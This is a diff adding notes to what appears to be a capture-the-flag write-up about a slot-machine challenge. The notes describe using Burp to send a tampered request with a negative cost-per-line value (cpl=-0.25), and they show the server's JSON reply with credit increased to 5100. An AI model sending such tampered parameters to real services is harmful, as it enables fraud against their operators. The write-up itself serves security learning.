@@ -35,3 +35,47 @@ Noel Boetie:
 > It seems they're susceptible to parameter tampering.
 
 :link: **Parameter Tampering** [link](https://owasp.org/www-community/attacks/Web_Parameter_Tampering)
+
+* Used 'Burp' to change request to `betamount=1000&numline=20&cpl=-0.25`
+* Server response:
+
+```json
+{
+  "success": true,
+  "data": {
+    "credit": 5100,
+    "jackpot": 0,
+    "free_spin": 0,
+    "free_num": 0,
+    "scaler": 0,
+    "num_line": 20,
+    "bet_amount": 1000,
+    "pull": {
+      "WinAmount": -3750,
+      "FreeSpin": 0,
+      "WildFixedIcons": [],
+      "HasJackpot": false,
+      "HasScatter": false,
+      "WildColumIcon": "",
+      "ScatterPrize": 0,
+      "SlotIcons": [
+        "icon9",
+        "icon6",
+        "scatter",
+        "icon3",
+        "wild"
+      ],
+      "ActiveIcons": [
+        11,
+        12,
+        3
+      ],
+      "ActiveLines": [
+        19
+      ]
+    },
+    "response": "I'm going to have some bouncer trolls bounce you right out of this casino!"
+  },
+  "message": "Spin success"
+}
+```
